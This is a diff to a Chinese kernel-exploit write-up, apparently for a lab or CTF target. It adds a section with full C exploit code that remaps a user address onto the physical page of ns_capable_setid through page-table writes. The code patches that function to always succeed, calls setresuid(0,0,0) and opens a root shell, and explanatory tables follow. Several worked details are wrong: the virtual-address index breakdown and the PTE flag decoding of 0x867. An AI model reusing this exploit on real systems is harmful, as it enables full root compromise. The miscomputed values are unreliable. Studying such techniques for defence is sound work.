@@ -1680,7 +1680,7 @@ int check_memory_access(struct task_struct *tsk, uint64_t vaddr,
 | 保留位校验 | 条目格式   | 硬件验证   | 检测损坏条目 |
 | 范围检查   | 地址有效性 | 边界比较   | 防止越界访问 |
 | 权限一致性 | 层级间权限 | 遍历验证   | 确保权限传递 |
-| 加密保护   | 页表数据   | 内存加密   | 防物理攻击   |
+| 加密保护   | 页表数据   | 内存加密   | 防物理利用   |
 | 监控审计   | 修改行为   | 日志记录   | 事后分析     |
 
 **完整性验证算法**：
@@ -2995,7 +2995,7 @@ sequenceDiagram
 
 **相邻概率分析模型**
 
-为评估布局策略的有效性，我们建立概率模型来估算目标对象与管道缓冲区物理相邻的可能性。
+为评估布局策略的有效性，建立概率模型来估算目标对象与管道缓冲区物理相邻的可能性。
 
 1. 模型假设：
 
@@ -4882,7 +4882,7 @@ retry_exploit:
   log.info("遍历页表以定位内核栈物理页");
 
   // 内核栈在vmalloc区域分配，可能不物理连续
-  // 我们定位内核栈的最后一页（4页内核栈中的第4页），避免干扰活跃栈帧
+  // 定位内核栈的最后一页（4页内核栈中的第4页），避免干扰活跃栈帧
   stack_addr_another = vaddr_resolve(pgd_addr, stack_addr + PAGE_SIZE * 3);
   stack_addr_another &= (~PAGE_ATTR_NX); // 清除NX位以获得可执行映射
   stack_addr_another += page_offset_base;
@@ -5013,7 +5013,7 @@ void get_root_shell(void) {
 
 本技术实现完整展示了从基础环境准备到系统权限提升的十二个连续阶段，构建了一个从微操作到系统控制的完整技术链条。第一阶段完成环境初始化与系统准备，建立稳定的操作基础；第二阶段通过精细的内存布局控制实现物理内存的确定性分布；第三阶段利用单字节修改触发非对称页面共享，实现微操作级联放大效应；第四阶段建立双重标记验证机制，确保状态转换的可预测性和可验证性；第五阶段提取内核元数据，获取内核基址和关键偏移；第六阶段构建二级控制链，建立可控的内存访问路径；第七阶段构造Pipe Chain，实现数据结构间的稳定关联；第八阶段构建物理内存读写原语，获得底层内存操作能力；第九阶段进行系统内存勘探，定位关键内存区域和数据结构；第十阶段提取PGD与内核栈地址，为权限提升奠定基础；第十一阶段实现四级页表解析算法，建立完整的内存转换体系；第十二阶段通过安全的内核栈注入和ROP链执行，最终实现从用户态普通权限到root权限的安全提升。整个技术体系体现了内存控制技术从基础原语到系统控制的全流程演进，为内存安全研究提供了完整的技术参考和实践案例。
 
-### 5. 测试结果
+## 5. 测试结果
 
 <div style="text-align: center; margin: 2rem 0;">
   <img src="/images/posts/KernelExploit/CrossCacheOverflow/CrossCacheOverflow_004.png"
@@ -5023,8 +5023,731 @@ void get_root_shell(void) {
               height: auto;">
 </div>
 
+## 6. 进阶分析：USMA技术
+
+exploit核心代码如下：
+
+```c
+/*
+ * ============================================================================
+ * PRIVILEGE ESCALATION
+ * ============================================================================
+ */
+
+#define PTE_OFFSET 12
+#define PMD_OFFSET 21
+#define PUD_OFFSET 30
+#define PGD_OFFSET 39
+
+#define PT_ENTRY_MASK 0b111111111UL
+#define PTE_MASK (PT_ENTRY_MASK << PTE_OFFSET)
+#define PMD_MASK (PT_ENTRY_MASK << PMD_OFFSET)
+#define PUD_MASK (PT_ENTRY_MASK << PUD_OFFSET)
+#define PGD_MASK (PT_ENTRY_MASK << PGD_OFFSET)
+
+#define PTE_ENTRY(addr) ((addr >> PTE_OFFSET) & PT_ENTRY_MASK)
+#define PMD_ENTRY(addr) ((addr >> PMD_OFFSET) & PT_ENTRY_MASK)
+#define PUD_ENTRY(addr) ((addr >> PUD_OFFSET) & PT_ENTRY_MASK)
+#define PGD_ENTRY(addr) ((addr >> PGD_OFFSET) & PT_ENTRY_MASK)
+
+#define PAGE_ATTR_RW (1UL << 1)
+#define PAGE_ATTR_NX (1UL << 63)
+
+// Kernel page table management state tracking
+size_t pgd_addr;                            // Page global directory address
+size_t mm_struct_addr;                      // Memory management structure address
+size_t *mm_struct_buf;                      // Buffer for mm_struct data
+size_t stack_addr;                          // Current kernel stack virtual address
+size_t stack_addr_another;                  // Alternate kernel stack virtual address
+size_t stack_page;                          // Physical page containing kernel stack
+size_t mm_struct_page;                      // Physical page containing mm_struct
+
+// Traverse 4-level paging hierarchy to resolve virtual address to physical address
+// Returns physical page frame number for the given virtual address
+size_t vaddr_resolve(size_t pgd_addr, size_t vaddr) {
+  size_t page_table_buffer[0x1000];
+  size_t pud_addr, pmd_addr, pte_addr, pte_val;
+
+  // Level 4: Page Global Directory -> Page Upper Directory
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pgd_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pgd_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pud_addr = (page_table_buffer[PGD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pud_addr += page_offset_base;
+  log.debug("Resolved PGD(%#lx)[%#lx] -> PUD: %#lx", pgd_addr, PGD_ENTRY(vaddr), pud_addr);
+
+  // Level 3: Page Upper Directory -> Page Middle Directory
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pud_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pud_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pmd_addr = (page_table_buffer[PUD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pmd_addr += page_offset_base;
+  log.debug("Resolved PUD(%#lx)[%#lx] -> PMD: %#lx", pud_addr, PUD_ENTRY(vaddr), pmd_addr);
+
+  // Level 2: Page Middle Directory -> Page Table Entry
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pmd_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pmd_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pte_addr = (page_table_buffer[PMD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pte_addr += page_offset_base;
+  log.debug("Resolved PMD(%#lx)[%#lx] -> PTE: %#lx", pmd_addr, PMD_ENTRY(vaddr), pte_addr);
+
+  // Level 1: Page Table Entry -> Physical Page Frame
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pte_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pte_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pte_val = (page_table_buffer[PTE_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  log.debug("Resolved PTE(%#lx)[%#lx] -> Physical frame: %#lx", pte_addr, PTE_ENTRY(vaddr), pte_val);
+  return pte_val;
+}
+
+// Optimized virtual address resolution for 3-level paging (legacy PAE mode)
+// Skips PTE level for 2MB large pages with 3-level hierarchy
+size_t vaddr_resolve_for_3_level(size_t pgd_addr, size_t vaddr) {
+  size_t page_table_buffer[0x1000];
+  size_t pud_addr, pmd_addr, pmd_value;
+
+  // Level 4: Page Global Directory -> Page Upper Directory
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pgd_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pgd_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pud_addr = (page_table_buffer[PGD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pud_addr += page_offset_base;
+  log.debug("Resolved PGD(%#lx)[%#lx] -> PUD: %#lx", pgd_addr, PGD_ENTRY(vaddr), pud_addr);
+
+  // Level 3: Page Upper Directory -> Page Middle Directory
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pud_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pud_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pmd_addr = (page_table_buffer[PUD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pmd_addr += page_offset_base;
+  log.debug("Resolved PUD(%#lx)[%#lx] -> PMD: %#lx", pud_addr, PUD_ENTRY(vaddr), pmd_addr);
+
+  // Level 2: Page Middle Directory -> 2MB large page frame
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pmd_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pmd_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pmd_value = (page_table_buffer[PMD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  log.debug("Resolved PMD(%#lx)[%#lx] -> value: %#lx", pmd_addr, PMD_ENTRY(vaddr), pmd_value);
+  return pmd_value;
+}
+
+// Remap virtual address to new physical address by modifying page table entries
+// Establishes writable mapping for target virtual address
+void vaddr_remapping(size_t pgd_addr, size_t vaddr, size_t paddr) {
+  size_t page_table_buffer[0x1000];
+  size_t pud_addr, pmd_addr, pte_addr, pte_val;
+
+  // Level 4: Page Global Directory -> Page Upper Directory
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pgd_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pgd_addr), 0x1000, page_table_buffer, 0xf00);
+  pud_addr = (page_table_buffer[PGD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pud_addr += page_offset_base;
+  log.debug("Resolved PGD(%#lx)[%#lx] -> PUD: %#lx", pgd_addr, PGD_ENTRY(vaddr), pud_addr);
+
+  // Level 3: Page Upper Directory -> Page Middle Directory
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pud_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pud_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pmd_addr = (page_table_buffer[PUD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pmd_addr += page_offset_base;
+  log.debug("Resolved PUD(%#lx)[%#lx] -> PMD: %#lx", pud_addr, PUD_ENTRY(vaddr), pmd_addr);
+
+  // Level 2: Page Middle Directory -> Page Table Entry
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pmd_addr), 0, page_table_buffer, 0x1000);
+  arbitrary_phys_read(direct_map_addr_to_page_addr(pmd_addr), 0x1000, &page_table_buffer[512], 0xf00);
+  pte_addr = (page_table_buffer[PMD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+  pte_addr += page_offset_base;
+  log.debug("Resolved PMD(%#lx)[%#lx] -> PTE: %#lx", pmd_addr, PMD_ENTRY(vaddr), pte_addr);
+
+  // Level 1: Read current PTE value before modification
+  if(PTE_ENTRY(vaddr) >= 0x1000 / 8) {
+      arbitrary_phys_read(direct_map_addr_to_page_addr(pte_addr), 0x1000, &page_table_buffer[512], 0xff0);
+      pte_val = (page_table_buffer[PTE_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+      log.debug("Resolved PTE(%#lx)[%#lx] -> Physical frame: %#lx", pte_addr, PTE_ENTRY(vaddr), pte_val);
+
+      // Update PTE with new physical address and writable permissions
+      page_table_buffer[PTE_ENTRY(vaddr)] = paddr | 0x8000000000000867; // Set writable flag
+      arbitrary_phys_write(direct_map_addr_to_page_addr(pte_addr), 0x1000, &page_table_buffer[512], 0xff0);
+      log.debug("Updated PTE(%#lx)[%#lx] -> Physical frame: %#lx",
+          pte_addr, PTE_ENTRY(vaddr), page_table_buffer[PTE_ENTRY(vaddr)]);
+  } else {
+      arbitrary_phys_read(direct_map_addr_to_page_addr(pte_addr), 0, page_table_buffer, 0xff0);
+      pte_val = (page_table_buffer[PTE_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
+      log.debug("Resolved PTE(%#lx)[%#lx] -> Physical frame: %#lx", pte_addr, PTE_ENTRY(vaddr), pte_val);
+
+      // Update PTE with new physical address and writable permissions
+      page_table_buffer[PTE_ENTRY(vaddr)] = paddr | 0x8000000000000867; // Set writable flag
+      arbitrary_phys_write(direct_map_addr_to_page_addr(pte_addr), 0, page_table_buffer, 0xff0);
+      log.debug("Updated PTE(%#lx)[%#lx] -> Physical frame: %#lx",
+          pte_addr, PTE_ENTRY(vaddr), page_table_buffer[PTE_ENTRY(vaddr)]);
+  }
+}
+
+// Extract process memory management structures from task_struct
+// Resolves kernel page table root (PGD) and stack addresses for ROP targeting
+void pgd_vaddr_resolve(void) {
+  size_t round = 0;
+  size_t page_buffer[0x1000];
+  size_t *current_comm_ptr = NULL;
+
+  log.info("Reading current task_struct via physical memory mapping");
+  for (round = 0; ; round++) {
+      memset(page_buffer, 0, 0x1000);
+      arbitrary_phys_read(((current_task_page_addr & (~0xfff)) + round * 0x40), 0, page_buffer, 0xf00);
+
+      current_comm_ptr = (size_t*)memmem(page_buffer, 0xf00, "pwn4kernel", 10);
+
+      // Validate current task_struct by checking critical field integrity
+      if (current_comm_ptr && (current_comm_ptr[-2] > 0xffff888000000000)      // cred validity
+          && (current_comm_ptr[-3] > 0xffff888000000000)                       // real_cred validity
+          && (current_comm_ptr[-57] > 0xffff888000000000)                      // real_parent validity
+          && (current_comm_ptr[-56] > 0xffff888000000000)) {                   // parent validity
+          // Calculate field offsets based on known task_struct layout
+          // mm_struct offset: 0x920, stack offset: 0x20, comm offset: 0xb70
+          // mm offset index: (0xb70 - 0x920) / 8 = 74
+          // stack offset index: (0xb70 - 0x20) / 8 = 362
+          mm_struct_addr = current_comm_ptr[-74];
+          stack_addr = current_comm_ptr[-362];
+          log.success("[Round %d] Resolved kernel stack virtual address: 0x%lx", round, stack_addr);
+          log.success("[Round %d] Resolved mm_struct virtual address: 0x%lx", round, mm_struct_addr);
+          break;
+      }
+  }
+
+  mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);
+  log.success("[Round %d] Calculated mm_struct physical page: 0x%lx", round, mm_struct_page);
+
+  // Read mm_struct to extract page table root
+  arbitrary_phys_read(mm_struct_page, 0, page_buffer, 0xf00);
+  mm_struct_buf = (size_t *)((size_t)page_buffer + (mm_struct_addr & 0xfff));
+  pgd_addr = mm_struct_buf[9]; // mm->pgd field index
+  log.success("[Round %d] Extracted kernel page table root (PGD): 0x%lx", round, pgd_addr);
+}
+
+/*
+ * ============================================================================
+ * USER-SPACE MEMORY MAPPING ATTACK (USMA) PRIVILEGE ESCALATION
+ * ============================================================================
+ */
+
+// Kernel symbol for ns_capable_setid function
+#define NS_CAPABLE_SETID 0xffffffff810fd4b0
+
+/**
+ * Privilege escalation via User-Space Memory Mapping Attack
+ *
+ * This method exploits the ability to remap kernel code pages into user-space
+ * memory by manipulating page table entries. The exploit creates a user-space
+ * mapping that points to the physical page containing ns_capable_setid,
+ * modifies the kernel code to always return success, and then triggers the
+ * modified function via setresuid() to obtain root privileges.
+ *
+ * Technique overview:
+ * 1. Resolve kernel page table hierarchy to locate target function
+ * 2. Create user-space memory mapping for code modification
+ * 3. Remap virtual addresses to point to kernel code physical pages
+ * 4. Patch ns_capable_setid to bypass permission checks
+ * 5. Trigger modified function and elevate privileges
+ */
+void privilege_escalation_by_usma(void) {
+  char *user_code_mapping;                      // User-space mapping for kernel code
+  size_t target_phys_addr;                      // Physical address of target function
+  size_t target_virt_addr;                      // Virtual address of target function
+
+  //==================================================================
+  // Step 1: RESOLVE KERNEL MEMORY MANAGEMENT STRUCTURES
+  //==================================================================
+  log.info("Resolving kernel page table hierarchy for USMA exploitation");
+  pgd_vaddr_resolve();
+
+  //==================================================================
+  // Step 2: CREATE USER-SPACE MEMORY MAPPING FOR CODE MODIFICATION
+  //==================================================================
+  log.info("Creating user-space memory mapping for kernel code manipulation");
+  user_code_mapping = mmap((void *)0x114514000, 0x2000, PROT_READ | PROT_WRITE,
+                           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+  if (user_code_mapping == MAP_FAILED) {
+    log.error("Failed to allocate user-space memory mapping for code injection");
+    log.error("mmap error: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  log.success("Established user-space mapping at address: 0x%lx", (size_t)user_code_mapping);
+
+  // Bypass lazy allocation by writing to both pages in the mapping
+  log.debug("Initializing mapping pages to bypass lazy allocation mechanism");
+  for (int i = 0; i < 8; i++) {
+    user_code_mapping[i] = "BinRacer"[i];                 // Write to first page
+    user_code_mapping[i + 0x1000] = "BinRacer"[i];        // Write to second page
+  }
+
+  //==================================================================
+  // Step 3: LOCATE TARGET KERNEL FUNCTION PHYSICAL ADDRESS
+  //==================================================================
+  log.info("Calculating target kernel function addresses for remapping");
+  target_virt_addr = NS_CAPABLE_SETID + kernel_offset;
+  log.success("Resolved ns_capable_setid virtual address: 0x%lx", target_virt_addr);
+
+  // Resolve physical address using 3-level page table traversal
+  target_phys_addr = vaddr_resolve_for_3_level(pgd_addr, target_virt_addr);
+  target_phys_addr += 0x1000 * PTE_ENTRY(target_virt_addr);
+  log.success("Resolved ns_capable_setid physical address: 0x%lx", target_phys_addr);
+
+  //==================================================================
+  // Step 4: REMAP USER-SPACE ADDRESSES TO KERNEL PHYSICAL PAGES
+  //==================================================================
+  log.info("Remapping user-space addresses to kernel code physical pages");
+  vaddr_remapping(pgd_addr, 0x114514000, target_phys_addr);
+  vaddr_remapping(pgd_addr, 0x114514000 + 0x1000, target_phys_addr + 0x1000);
+  log.success("Completed virtual-to-physical address remapping for kernel code access");
+
+  //==================================================================
+  // Step 5: MODIFY KERNEL CODE TO BYPASS PERMISSION CHECKS
+  //==================================================================
+  log.info("Starting kernel code segment modification via user-space mapping");
+
+  /**
+   * Patch ns_capable_setid to always return success (1)
+   *
+   * The original function checks if the current process has the required
+   * capabilities. By patching it to return 1 unconditionally, we bypass
+   * all capability checks performed by setresuid() and similar functions.
+   *
+   * Patch structure:
+   * 1. 0x40 bytes of NOP sled for alignment and safety
+   * 2. endbr64 instruction for Control-Flow Enforcement Technology
+   * 3. mov rax, 1 to set return value
+   * 4. ret instruction to return to caller
+   */
+  size_t page_offset = NS_CAPABLE_SETID & 0xfff;
+  memset(user_code_mapping + page_offset, '\x90', 0x40);  // NOP sled
+  memcpy(user_code_mapping + page_offset + 0x40,
+         "\xf3\x0f\x1e\xfa"             /* endbr64 */
+         "\x48\xc7\xc0\x01\x00\x00\x00" /* mov rax, 1 */
+         "\xc3",                        /* ret */
+         12);
+  log.success("Kernel code modification completed - ns_capable_setid patched to always return success");
+
+  //==================================================================
+  // Step 6: TRIGGER MODIFIED FUNCTION AND OBTAIN ROOT PRIVILEGES
+  //==================================================================
+  log.info("Triggering patched ns_capable_setid via setresuid() system call");
+  log.info("Waiting 1 second for system state stabilization");
+
+  sleep(1);
+
+  // Call setresuid(0, 0, 0) which internally uses ns_capable_setid
+  // The patched function will return success regardless of actual capabilities
+  if (setresuid(0, 0, 0) < 0) {
+    log.error("setresuid() failed to elevate privileges");
+    log.error("Error: %s", strerror(errno));
+  } else {
+    log.success("Successfully called setresuid() with patched ns_capable_setid");
+  }
+
+  // Verify and obtain root shell
+  get_root_shell();
+}
+
+/*
+ * ============================================================================
+ * MAIN EXPLOIT CONTROLLER
+ * ============================================================================
+ */
+int main(int argc, char **argv) {
+    log.info("===========================================================");
+    log.info("           KERNEL CROSS-CACHE OVERFLOW EXPLOIT             ");
+    log.info("===========================================================");
+    puts("");
+
+    //==================================================================
+    // PHASE 1: ENVIRONMENT BOOTSTRAP
+    //==================================================================
+    log.info("===========================================================");
+    log.info("PHASE 1: ENVIRONMENT INITIALIZATION & DEVICE SETUP         ");
+    log.info("===========================================================");
+    setup_environment();
+    puts("");
+
+    //==================================================================
+    // PHASE 2: HEAP LAYOUT ENGINEERING
+    //==================================================================
+    log.info("===========================================================");
+    log.info("PHASE 2: HEAP LAYOUT ORCHESTRATION & SPRAYING              ");
+    log.info("===========================================================");
+    prepare_heap_layout();
+    puts("");
+
+    //==================================================================
+    // PHASE 3: CROSS-CACHE CORRUPTION & PRIMITIVE BUILDING
+    //==================================================================
+    log.info("===========================================================");
+    log.info("PHASE 3: CORE EXPLOITATION & MEMORY PRIMITIVES             ");
+    log.info("===========================================================");
+
+    trigger_cross_cache_overflow();
+    if (identify_corrupted_pipes() < 0) {
+        cleanup_resources();
+        exit(EXIT_FAILURE);
+    }
+    extract_kernel_pointers();
+    if (build_arbitrary_rw_chain() < 0) {
+        cleanup_resources();
+        exit(EXIT_FAILURE);
+    }
+    puts("");
+
+    //==================================================================
+    // PHASE 4: KERNEL INTELLIGENCE GATHERING
+    //==================================================================
+    log.info("===========================================================");
+    log.info("PHASE 4: KERNEL MEMORY RECONNAISSANCE & MAPPING            ");
+    log.info("===========================================================");
+    find_vmemmap_base();
+    scan_for_task_structs();
+    puts("");
+
+    //==================================================================
+    // PHASE 5: PRIVILEGE ESCALATION
+    //==================================================================
+    log.info("===========================================================");
+    log.info("PHASE 5: ROOT PRIVILEGE ACQUISITION VIA USMA               ");
+    log.info("===========================================================");
+    privilege_escalation_by_usma();
+    puts("");
+
+    //==================================================================
+    // PHASE 6: POST-EXPLOITATION CLEANUP RESOURCES
+    //==================================================================
+    log.info("===========================================================");
+    log.info("PHASE 6: POST-EXPLOITATION CLEANUP RESOURCES               ");
+    log.info("===========================================================");
+    cleanup_resources();
+    return 0;
+}
+```
+
+### 6-1. USMA技术概述
+
+**用户空间内存映射攻击**是一种创新的内核控制技术，它通过修改内核页表条目，将内核代码段重映射到用户空间地址，实现对内核代码的运行时修改。与内核栈利用技术不同，USMA技术直接在页表层面进行操作，无需依赖内核栈控制或代码注入。
+
+**技术原理核心**：通过页表重定向机制，将用户空间虚拟地址映射到内核代码的物理页面，从而在用户空间直接修改内核代码段。这种方法绕过了内核保护机制，实现了对内核执行逻辑的安全修改。
+
+### 6-2. 页表操作核心宏定义
+
+USMA技术的核心是通过精确控制x86_64架构的四级页表系统，实现对内核内存地址空间的重映射。以下宏定义构成了页表操作的基础：
+
+```c
+/*
+ * 四级页表索引计算宏定义
+ * x86_64架构下，48位虚拟地址被分为四个9位的索引和一个12位的页内偏移
+ */
+
+#define PTE_OFFSET 12    // 页表项索引偏移
+#define PMD_OFFSET 21    // 页中间目录索引偏移
+#define PUD_OFFSET 30    // 页上级目录索引偏移
+#define PGD_OFFSET 39    // 页全局目录索引偏移
+
+#define PT_ENTRY_MASK 0b111111111UL  // 9位索引掩码
+
+// 虚拟地址索引提取宏
+#define PTE_ENTRY(addr) ((addr >> PTE_OFFSET) & PT_ENTRY_MASK)
+#define PMD_ENTRY(addr) ((addr >> PMD_OFFSET) & PT_ENTRY_MASK)
+#define PUD_ENTRY(addr) ((addr >> PUD_OFFSET) & PT_ENTRY_MASK)
+#define PGD_ENTRY(addr) ((addr >> PGD_OFFSET) & PT_ENTRY_MASK)
+
+// 页表属性标志定义
+#define PAGE_ATTR_RW (1UL << 1)  // 可写标志
+#define PAGE_ATTR_NX (1UL << 63) // 不可执行标志
+```
+
+**虚拟地址分解示意图**：
+
+```
+虚拟地址: 0xffff888012345678
+├── 位[63:48]: 符号扩展位
+├── 位[47:39]: PGD索引 (9位) → 0x1
+├── 位[38:30]: PUD索引 (9位) → 0x0
+├── 位[29:21]: PMD索引 (9位) → 0x123
+├── 位[20:12]: PTE索引 (9位) → 0x45
+└── 位[11:0]:  页内偏移 (12位) → 0x678
+```
+
+### 6-3. 页表操作函数实现
+
+#### 6-3-1. 虚拟地址到物理地址解析
+
+`vaddr_resolve`函数通过四级页表遍历，将虚拟地址转换为物理地址。这个函数模拟了硬件内存管理单元的工作流程，逐级解析页表条目，最终获取目标虚拟地址对应的物理页帧。
+
+**四级页表遍历流程**：
+
+```mermaid
+sequenceDiagram
+    participant 调用者
+    participant PGD解析
+    participant PUD解析
+    participant PMD解析
+    participant PTE解析
+    participant 物理内存
+
+    调用者->>PGD解析: 提供PGD地址和虚拟地址
+    PGD解析->>物理内存: 读取PGD页
+    PGD解析->>PUD解析: 传递PUD地址
+    PUD解析->>物理内存: 读取PUD页
+    PUD解析->>PMD解析: 传递PMD地址
+    PMD解析->>物理内存: 读取PMD页
+    PMD解析->>PTE解析: 传递PTE地址
+    PTE解析->>物理内存: 读取PTE页
+    PTE解析->>调用者: 返回物理页帧地址
+```
+
+**函数实现关键点**：
+
+1. 逐级遍历页表层次结构
+2. 处理页表条目的属性标志
+3. 转换物理地址为内核虚拟地址
+4. 输出详细的调试信息
+
+#### 6-3-2. 优化三级页表解析
+
+针对使用2MB大页的内核配置，提供优化版的地址解析函数`vaddr_resolve_for_3_level`。这个函数跳过了PTE级别，直接处理2MB大页映射，提高了地址解析效率。
+
+**2MB大页映射优势**：
+
+| 特性      | 标准4KB页   | 2MB大页          |
+| --------- | ----------- | ---------------- |
+| 页表层级  | 4级         | 3级（跳过PTE）   |
+| 转换次数  | 4次内存访问 | 3次内存访问      |
+| TLB利用率 | 较低        | 较高             |
+| 内存占用  | 较多页表    | 较少页表         |
+| 适合场景  | 通用内存    | 代码段、大缓冲区 |
+
+#### 6-3-3. 虚拟地址重映射
+
+`vaddr_remapping`函数修改页表条目，实现虚拟地址到物理地址的重新映射。这是USMA技术的核心，通过修改PTE条目，将用户空间虚拟地址映射到内核代码物理页。
+
+**重映射实现步骤**：
+
+1. 遍历页表获取目标PTE地址
+2. 读取当前PTE条目值
+3. 修改PTE条目指向新的物理地址
+4. 设置适当的页面属性标志
+5. 写回修改后的PTE条目
+
+**PTE条目权限标志解析**：
+
+```
+PTE条目权限标志: 0x8000000000000867
+位分解:
+┌───────────────────────┐
+│ 63: NX (No Execute) = 1 (0x8000000000000000) │
+│ 7:  PS (Page Size)  = 0 (标准4KB页)          │
+│ 6:  D  (Dirty)      = 0 (未修改)             │
+│ 5:  A  (Accessed)   = 1 (已访问)             │
+│ 4:  PCD (Cache Disable) = 0 (启用缓存)       │
+│ 3:  PWT (Write Through) = 0 (回写)           │
+│ 2:  U/S (User/Supervisor) = 0 (内核访问)     │
+│ 1:  R/W (Read/Write) = 1 (可写)              │
+│ 0:  P  (Present)    = 1 (页面存在)           │
+└───────────────────────┘
+```
+
+### 6-4. 内核内存管理结构提取
+
+`pgd_vaddr_resolve`函数从`task_struct`中提取关键的内存管理结构信息。这个函数通过扫描物理内存，定位当前进程的任务结构，并提取其中的关键指针字段。
+
+**提取流程**：
+
+1. 在物理内存中搜索特征字符串定位`task_struct`
+2. 验证关键指针字段的有效性
+3. 计算字段偏移并提取地址
+4. 从`mm_struct`中提取PGD地址
+
+**task_struct字段偏移计算**：
+
+| 字段          | 在task_struct中的偏移 | 相对于comm的字节偏移 | 索引计算   | 实际索引 |
+| ------------- | --------------------- | -------------------- | ---------- | -------- |
+| `comm`        | 0xb70                 | 0                    | 0/8        | 0        |
+| `cred`        | 0xb60                 | -0x10                | (-0x10)/8  | -2       |
+| `real_cred`   | 0xb58                 | -0x18                | (-0x18)/8  | -3       |
+| `real_parent` | 0x9a8                 | -0x1C8               | (-0x1C8)/8 | -57      |
+| `parent`      | 0x9b0                 | -0x1C0               | (-0x1C0)/8 | -56      |
+| `mm_struct`   | 0x920                 | -0x250               | (-0x250)/8 | -74      |
+| `stack`       | 0x20                  | -0xB50               | (-0xB50)/8 | -362     |
+
+### 6-5. USMA权限提升流程
+
+`privilege_escalation_by_usma`函数通过六个步骤实现权限提升，展示了USMA技术的完整应用流程。
+
+#### 步骤1：解析内核页表结构
+
+首先通过`pgd_vaddr_resolve`函数解析内核页表层次结构，获取当前进程的PGD地址、`mm_struct`地址和内核栈地址。这是USMA技术的基础，为后续的页表操作提供了必要的上下文信息。
+
+#### 步骤2：创建用户空间内存映射
+
+通过`mmap`系统调用在用户空间创建内存映射区域，用于后续的内核代码修改。这个映射区域将作为内核代码的"镜像"，允许在用户空间直接访问和修改内核代码。
+
+**映射参数说明**：
+
+| 参数       | 值                           | 说明             |
+| ---------- | ---------------------------- | ---------------- |
+| 起始地址   | 0x114514000                  | 用户空间固定地址 |
+| 映射大小   | 0x2000                       | 8KB，两页        |
+| 保护标志   | PROT_READ \| PROT_WRITE      | 可读可写         |
+| 映射标志   | MAP_ANONYMOUS \| MAP_PRIVATE | 匿名私有映射     |
+| 文件描述符 | -1                           | 不关联文件       |
+| 偏移       | 0                            | 从文件开始       |
+
+#### 步骤3：定位目标内核函数
+
+计算目标内核函数`ns_capable_setid`的虚拟地址和物理地址。这个函数是Linux内核中检查进程能力的核心函数，被`setresuid()`等系统调用使用。
+
+**内核符号定义**：
+
+```c
+#define NS_CAPABLE_SETID 0xffffffff810fd4b0
+```
+
+**地址解析过程**：
+
+1. 计算虚拟地址：`NS_CAPABLE_SETID + kernel_offset`
+2. 使用三级页表解析获取物理地址
+3. 计算页内偏移，得到精确的物理地址
+
+#### 步骤4：重映射用户空间地址
+
+通过`vaddr_remapping`函数修改页表条目，将用户空间地址重映射到内核代码物理页。这个步骤是USMA技术的核心，实现了用户空间对内核代码的直接访问。
+
+**重映射原理**：
+
+```
+重映射前后对比:
+
+重映射前:
+用户空间地址: 0x114514000 → 匿名页面 (物理地址: 0xXXXXXXXX)
+内核空间地址: 0xffffffff810fd4b0 → 内核代码页 (物理地址: 0xYYYYYYYY)
+
+重映射后:
+用户空间地址: 0x114514000 → 内核代码页 (物理地址: 0xYYYYYYYY)
+内核空间地址: 0xffffffff810fd4b0 → 内核代码页 (物理地址: 0xYYYYYYYY)
+```
+
+#### 步骤5：修改内核代码
+
+通过用户空间映射修改内核函数`ns_capable_setid`的代码，使其始终返回1（表示权限检查通过）。这个修改绕过了内核的能力检查逻辑，实现了权限控制机制的旁路。
+
+**补丁代码分析**：
+
+```assembly
+; 注入的补丁代码
+补丁位置:
+    nop sled (0x40字节)          ; 对齐和安全性填充
+    endbr64                      ; Intel CET支持
+    mov rax, 0x1                 ; 设置返回值为1 (成功)
+    ret                          ; 返回调用者
+```
+
+**补丁效果**：
+
+- 函数始终返回1，表示权限检查通过
+- 绕过所有能力检查逻辑
